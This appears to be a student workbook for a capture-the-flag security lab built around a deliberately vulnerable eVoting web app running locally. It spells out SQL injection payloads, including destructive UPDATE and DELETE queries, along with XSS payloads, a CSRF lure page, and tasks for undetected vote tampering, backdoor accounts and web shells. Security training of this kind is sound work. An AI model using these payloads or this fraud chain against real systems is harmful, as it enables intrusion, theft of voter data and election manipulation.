# eVoting Security Lab - Student Workbook

## 📋 Lab Information
**Student Name:** ___________________________  
**Date:** ___________________________  
**Lab Duration:** 4-6 hours  
**Difficulty Levels:** Beginner → Intermediate → Advanced → Expert

---

## 🎯 Learning Objectives

By completing this lab, you will:
- ✅ Identify and exploit SQL injection vulnerabilities
- ✅ Perform authentication bypass attacks
- ✅ Discover and exploit XSS vulnerabilities
- ✅ Test for broken access controls
- ✅ Exploit CSRF vulnerabilities
- ✅ Extract sensitive data
- ✅ Use professional security testing tools
- ✅ Document findings professionally

---

## 🔧 Lab Setup

### Step 1: Start the Environment
```bash
cd evoting-security-lab
docker-compose up -d
```

### Step 2: Verify Services
```bash
docker-compose ps
```

You should see:
- ✅ evoting_vulnerable_app (port 8181)
- ✅ evoting_mysql_db (port 3306)
- ✅ evoting_phpmyadmin (port 8080)

### Step 3: Access the Application
- **Main Application:** http://localhost:8181/evoting/login1.php
- **PHPMyAdmin:** http://localhost:8080

---

## 📝 Exercise 1: Reconnaissance (30 minutes)

### Objectives
- Map the application structure
- Identify entry points
- Discover hidden information

### Tasks

#### Task 1.1: Directory Enumeration
**Tool:** Browser, DirBuster, or curl

**Instructions:**
1. Navigate to http://localhost:8181/evoting/
2. What files and directories are visible?
3. Are directory listings enabled?

**Document your findings:**
```
Accessible files:
1. _____________________
2. _____________________
3. _____________________

Directory listing enabled: YES / NO

FLAG FOUND: ________________
```

#### Task 1.2: Source Code Review
**Instructions:**
1. View the source code of login1.php
2. Look for HTML comments
3. Identify exposed information

**Questions:**
- What database credentials did you find?
- Are there hardcoded usernames/passwords?
- What debugging information is exposed?

**Document:**
```
Exposed credentials:
Username: __________
Password: __________

FLAG FOUND: ________________
```

#### Task 1.3: Error Message Analysis
**Instructions:**
1. Try logging in with: `test' OR '1'='1`
2. Observe the error messages
3. What information do they reveal?

**Document:**
```
Database type: __________
Table names revealed: __________
SQL query structure: __________

FLAG FOUND: ________________
```

---

## 💉 Exercise 2: SQL Injection - Login Bypass (45 minutes)

### Objectives
- Bypass authentication using SQL injection
- Access admin panel
- Extract user credentials

### Background
SQL injection occurs when user input is directly inserted into SQL queries without proper sanitization.

### Tasks

#### Task 2.1: Boolean-Based SQL Injection
**Target:** login1.php

**Payloads to try:**
```sql
Username: admin' OR '1'='1
Password: anything

Username: admin' OR '1'='1'--
Password: (leave empty)

Username: ' OR 1=1--
Password: (leave empty)
```

**Questions:**
1. Which payload successfully bypassed authentication?
2. Where did you land after successful login?
3. Can you access the admin panel?

**Document:**
```
Successful payload: ___________________

Access gained to: ___________________

FLAG FOUND: ________________

Screenshot: [Attach here]
```

#### Task 2.2: Union-Based SQL Injection
**Objective:** Extract data from the database

**Payloads:**
```sql
Username: admin' UNION SELECT 1,2,3,4,5,6,7,8,9--
Password: anything

Username: admin' UNION SELECT CitizenNum,Username,Password,SSN,1,2,3,4,5 FROM person_info--
Password: anything
```

**Instructions:**
1. Try the payloads above
2. Observe what data is returned
3. Can you see other users' credentials?

**Document:**
```
Number of columns in query: __________

Data extracted:
User 1: ___________________
User 2: ___________________
User 3: ___________________

FLAG FOUND: ________________
```

#### Task 2.3: Blind SQL Injection
**Objective:** Detect SQL injection using timing attacks

**Payload:**
```sql
Username: admin' AND (SELECT SLEEP(5))--
Password: anything
```

**Questions:**
1. How long did the request take?
2. Did the 5-second delay confirm the vulnerability?
3. What other information could you extract using this technique?

**Document:**
```
Response time: __________ seconds

Blind SQLi confirmed: YES / NO

FLAG FOUND: ________________
```

---

## 🗳️ Exercise 3: Voting System Exploitation (45 minutes)

### Objectives
- Manipulate voting results
- Vote multiple times
- Exploit voting logic flaws

### Tasks

#### Task 3.1: Multiple Voting
**Target:** electioninfo2016.php

**Instructions:**
1. Log in with valid credentials (or use SQL injection)
2. Navigate to the voting page
3. Cast a vote for any candidate
4. Try voting again without logging out

**Questions:**
- Were you able to vote multiple times?
- What prevents (or doesn't prevent) double voting?
- Can you change the Voter ID to vote as someone else?

**Document:**
```
Multiple votes possible: YES / NO

Voter ID manipulation possible: YES / NO

Votes cast:
Vote 1: __________ (Voter ID: ______)
Vote 2: __________ (Voter ID: ______)
Vote 3: __________ (Voter ID: ______)

FLAG FOUND: ________________
```

#### Task 3.2: SQL Injection in Voting
**Objective:** Manipulate vote data using SQL injection

**Payloads to try:**
```sql
President: '; UPDATE ballot SET President_Selection='HACKED' WHERE 1=1--

President: '; DELETE FROM ballot WHERE Party_id=100--

StateNum: 1' UNION SELECT Username,Password,1,2 FROM person_info--
```

**Instructions:**
1. Intercept the voting request (use Burp Suite)
2. Inject SQL payloads
3. Check if the database was modified

**Document:**
```
Successful injection payload: ___________________

Result of injection: ___________________

Evidence (screenshot): [Attach]

FLAG FOUND: ________________
```

#### Task 3.3: Voter Impersonation
**Objective:** Vote as another user

**Instructions:**
1. Find a valid Voter ID (from database or SQL injection)
2. Cast a vote using that Voter ID
3. Verify the vote was recorded under their name

**Document:**
```
Target Voter ID: __________
Target Voter Name: __________

Impersonation successful: YES / NO

FLAG FOUND: ________________
```

---

## 🕷️ Exercise 4: Cross-Site Scripting (XSS) (45 minutes)

### Objectives
- Identify XSS vulnerabilities
- Craft effective XSS payloads
- Exploit stored and reflected XSS

### Tasks

#### Task 4.1: Reflected XSS in Login
**Target:** login1.php

**Payloads:**
```html
Username: <script>alert('XSS')</script>
Username: <img src=x onerror=alert('XSS')>
Username: <svg onload=alert(document.cookie)>
```

**Instructions:**
1. Try each payload in the username field
2. Observe if the script executes
3. Can you steal cookies?

**Document:**
```
Successful XSS payload: ___________________

Script executed: YES / NO

Cookies accessible: ___________________

FLAG FOUND: ________________
```

#### Task 4.2: Stored XSS in Candidate Data
**Target:** AddNewCandidate.php

**Instructions:**
1. Access admin panel (use previous exploits)
2. Add a new candidate with XSS in description:
   ```html
   <script>alert('Stored XSS')</script>
   ```
3. Navigate to voting page and see if script executes

**Document:**
```
Stored XSS successful: YES / NO

Where does it execute: ___________________

FLAG FOUND: ________________
```

#### Task 4.3: DOM-Based XSS
**Instructions:**
1. Look for JavaScript that processes URL parameters
2. Test with: `?candidate=<script>alert('XSS')</script>`
3. Check analytics pages for DOM manipulation

**Document:**
```
DOM-based XSS found in: ___________________

Payload used: ___________________

FLAG FOUND: ________________
```

---

## 🔐 Exercise 5: Authentication & Authorization (45 minutes)

### Objectives
- Bypass authentication mechanisms
- Exploit broken access control
- Escalate privileges

### Tasks

#### Task 5.1: Find Hardcoded Credentials
**Instructions:**
1. Search source code for hardcoded credentials
2. Check HTML comments and JavaScript
3. Try the credentials you find

**Known locations to check:**
- login1.php
- connect.php
- config.php

**Document:**
```
Hardcoded credentials found:
1. Username: __________ Password: __________
2. Username: __________ Password: __________
3. Username: __________ Password: __________

FLAG FOUND: ________________
```

#### Task 5.2: Direct Admin Access
**Objective:** Access admin pages without authentication

**Instructions:**
1. Try accessing these URLs directly:
   - http://localhost:8181/evoting/AdminCode.php
   - http://localhost:8181/evoting/DeleteUser.php
   - http://localhost:8181/evoting/Analytics.php

**Questions:**
- Which pages are accessible without login?
- Is there any session validation?
- What admin functions can you perform?

**Document:**
```
Accessible admin pages:
1. ___________________
2. ___________________
3. ___________________

Session validation present: YES / NO

FLAG FOUND: ________________
```

#### Task 5.3: Horizontal Privilege Escalation
**Objective:** Access another user's data

**Instructions:**
1. Log in as a regular user
2. Find where user data is displayed/edited
3. Try changing CitizenNum or user ID parameters

**Example:**
```
accountinfo.php?CitizenNum=111111111
(change to another user's CitizenNum)
```

**Document:**
```
Can access other user's data: YES / NO

Method used: ___________________

FLAG FOUND: ________________
```

---

## 🛡️ Exercise 6: CSRF Exploitation (30 minutes)

### Objectives
- Understand CSRF attacks
- Create CSRF proof-of-concept
- Exploit voting system

### Tasks

#### Task 6.1: CSRF in Voting
**Instructions:**
1. Check if voting form has CSRF tokens
2. Create a malicious HTML page with auto-submit form

**Malicious page template:**
```html
<html>
<body>
<h1>Free iPhone!</h1>
<form action="http://localhost:8181/evoting/electioninfo2016.php" method="POST" id="csrf">
    <input type="hidden" name="president" value="ATTACKER_CANDIDATE">
    <input type="hidden" name="VoterId" value="50001">
    <input type="hidden" name="StateNum" value="1">
    <input type="hidden" name="submit" value="Submit">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**Document:**
```
CSRF tokens present: YES / NO

Attack successful: YES / NO

FLAG FOUND: ________________
```

#### Task 6.2: CSRF in User Deletion
**Objective:** Delete users via CSRF

**Instructions:**
1. Create CSRF page for DeleteUser.php
2. Host it locally
3. Test if admin visiting your page triggers deletion

**Document:**
```
CSRF in deletion successful: YES / NO

Users deleted: ___________________

FLAG FOUND: ________________
```

---

## 📊 Exercise 7: Data Extraction (45 minutes)

### Objectives
- Extract sensitive information
- Access database directly
- Find exposed backups

### Tasks

#### Task 7.1: Database Direct Access
**Instructions:**
1. Use credentials found earlier
2. Access MySQL on port 3306
3. Or use PHPMyAdmin at port 8080

**Commands:**
```bash
mysql -h localhost -P 3306 -u root -proot_password evoting

# Or try:
mysql -h localhost -P 3306 -u evoting_user -pevoting123 evoting
```

**Document:**
```
Database accessible: YES / NO

Tables found:
1. ___________________
2. ___________________
3. ___________________

Sensitive data extracted:
___________________

FLAG FOUND: ________________
```

#### Task 7.2: PHPMyAdmin Access
**Instructions:**
1. Navigate to http://localhost:8080
2. Try to login without credentials
3. Or use found credentials

**Document:**
```
PHPMyAdmin accessible: YES / NO

Authentication required: YES / NO

Root access gained: YES / NO

FLAG FOUND: ________________
```

#### Task 7.3: Extract All Voter Data
**Objective:** Get complete voter database

**SQL Queries:**
```sql
SELECT * FROM person_info;
SELECT * FROM voter JOIN ballot ON voter.V_id = ballot.V_id;
SELECT Username, Password, SSN FROM person_info;
```

**Document:**
```
Total records extracted: __________

Sensitive fields found:
- SSN: YES / NO
- Passwords: YES / NO  
- Addresses: YES / NO

Are passwords hashed: YES / NO

FLAG FOUND: ________________
```

---

## 🎓 Exercise 8: Advanced Challenges (60+ minutes)

### Challenge 8.1: Chain Exploits
**Objective:** Combine multiple vulnerabilities

**Scenario:** 
Start with no access → gain admin access → manipulate election → cover tracks

**Steps to chain:**
1. SQL injection to bypass login
2. XSS to steal admin session
3. CSRF to cast fraudulent votes
4. SQL injection to delete logs

**Document your attack chain:**
```
Step 1: ___________________
Step 2: ___________________
Step 3: ___________________
Step 4: ___________________

FLAGS FOUND: ________________
```

### Challenge 8.2: Election Fraud Simulation
**Objective:** Change election outcome without detection

**Requirements:**
- Make your candidate win
- Don't trigger obvious errors
- Make it look legitimate

**Document:**
```
Original results:
Candidate A: ____ votes
Candidate B: ____ votes
Candidate C: ____ votes

Modified results:
Candidate A: ____ votes
Candidate B: ____ votes  
Candidate C: ____ votes

Method used: ___________________

FLAG FOUND: ________________
```

### Challenge 8.3: Complete System Compromise
**Objective:** Gain complete control

**Tasks:**
- [ ] Extract all database data
- [ ] Create backdoor admin account
- [ ] Upload web shell (if file upload exists)
- [ ] Modify application code
- [ ] Establish persistence

**Document:**
```
Backdoor created: ___________________
Web shell location: ___________________
Persistence method: ___________________

SECRET FLAG FOUND: ________________
```

---

## 📋 Vulnerability Assessment Report Template

### Executive Summary
```
Date: ___________________
Tester: ___________________
System Tested: eVoting Web Application
Test Duration: ___________________

Critical Findings: ____
High Findings: ____
Medium Findings: ____
Low Findings: ____
```

### Detailed Findings

#### Finding #1: [Vulnerability Name]
**Severity:** Critical / High / Medium / Low  
**CVSS Score:** _____ 
**CWE ID:** _____

**Description:**
[Describe the vulnerability]

**Location:**
File: ___________________
Line: ___________________
Parameter: ___________________

**Proof of Concept:**
```
[Step-by-step reproduction]
```

**Impact:**
[Business and technical impact]

**Remediation:**
[Specific fixes needed]

**References:**
- OWASP: ___________________
- CWE: ___________________

---

#### [Repeat for each finding]

---

## 🏆 Flag Scoreboard

Track your progress:

| Flag ID | Points | Found | Time |
|---------|--------|-------|------|
| FLAG-SQL-001 | 100 | ☐ | ____ |
| FLAG-SQL-002 | 100 | ☐ | ____ |
| FLAG-SQL-003 | 100 | ☐ | ____ |
| FLAG-SQL-004 | 150 | ☐ | ____ |
| FLAG-SQL-005 | 200 | ☐ | ____ |
| FLAG-XSS-001 | 75 | ☐ | ____ |
| FLAG-XSS-002 | 100 | ☐ | ____ |
| FLAG-XSS-003 | 125 | ☐ | ____ |
| FLAG-AUTH-001 | 150 | ☐ | ____ |
| FLAG-AUTH-002 | 150 | ☐ | ____ |
| FLAG-BAC-001 | 100 | ☐ | ____ |
| FLAG-BAC-002 | 150 | ☐ | ____ |
| FLAG-CSRF-001 | 100 | ☐ | ____ |
| FLAG-DATA-001 | 125 | ☐ | ____ |
| FLAG-CONFIG-001 | 100 | ☐ | ____ |
| FLAG-ADV-001 | 250 | ☐ | ____ |
| FLAG-ADV-002 | 300 | ☐ | ____ |
| SECRET-FLAG-001 | 500 | ☐ | ____ |

**Total Points:** __________ / 3,375

---

## 📚 Additional Resources

### Tools Used
- [ ] Burp Suite Community
- [ ] OWASP ZAP
- [ ] SQLMap
- [ ] Browser DevTools
- [ ] Postman/Insomnia
- [ ] MySQL Client
- [ ] Python exploitation script

### Learning Resources
1. OWASP Top 10: https://owasp.org/www-project-top-ten/
2. PortSwigger Web Security Academy: https://portswigger.net/web-security
3. HackTheBox Academy: https://academy.hackthebox.com
4. OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/

---

## ✅ Lab Completion Checklist

- [ ] Environment setup completed
- [ ] All reconnaissance tasks finished
- [ ] SQL injection vulnerabilities exploited
- [ ] XSS vulnerabilities found
- [ ] Authentication bypassed
- [ ] CSRF attacks demonstrated
- [ ] Data extraction completed
- [ ] Advanced challenges attempted
- [ ] Vulnerability report written
- [ ] Screenshots documented
- [ ] All flags collected
- [ ] Remediation recommendations provided

---

## 🎓 Instructor Notes

**Grading Rubric:**

- Flags Found (40%): __________ / 40
- Report Quality (30%): __________ / 30
- Technical Understanding (20%): __________ / 20
- Presentation (10%): __________ / 10

**Total Grade:** __________ / 100

**Comments:**
```
[Instructor feedback]
```

---

**Remember:** 
- Document everything with screenshots
- Explain your methodology
- Provide remediation recommendations
- Follow responsible disclosure principles
- Only test authorized systems

**Good luck and happy hacking! 🚀**
